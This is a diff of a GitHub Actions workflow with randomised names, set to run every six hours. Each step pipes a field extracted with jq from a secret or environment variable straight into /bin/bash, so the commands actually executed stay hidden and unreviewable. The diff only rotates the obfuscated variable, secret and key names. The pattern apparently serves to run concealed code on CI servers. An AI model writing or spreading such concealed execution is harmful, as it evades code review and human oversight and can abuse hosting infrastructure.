@@ -1,22 +1,23 @@
 name: dongaoxiong6715
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 1/6 * * *'
-jobs:  # 4047
+    - cron: '3 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongaoxiong6715
         env:
-          sg5137: ${{ secrets.sg5137 }}
+          eh50: ${{ secrets.eh50 }}
         run: |
-          echo $sg5137 | jq -r .l07 | /bin/bash
-          echo $u00 | jq -r .i7386 | /bin/bash
-          echo $dxyat7164 | jq -r .jxau44 | /bin/bash
-          echo $a9644 | jq -r .la4 | /bin/bash
-          echo $yzbx1940 | jq -r .qior0 | /bin/bash
-          echo $hvoz62428 | jq -r .dpt1 | /bin/bash
+          echo $eh50 | jq -r .et17 | /bin/bash
+          echo $nvmsg7151 | jq -r .fl23812 | /bin/bash
+          echo $tvt3 | jq -r .ybd2 | /bin/bash
+          echo $cbp40 | jq -r .mg5979 | /bin/bash
+          echo $zg2861 | jq -r .b52 | /bin/bash
+          echo $tom84 | jq -r .bn7039 | /bin/bash
+          echo $fepig8570 | jq -r .jpf906 | /bin/bash
 
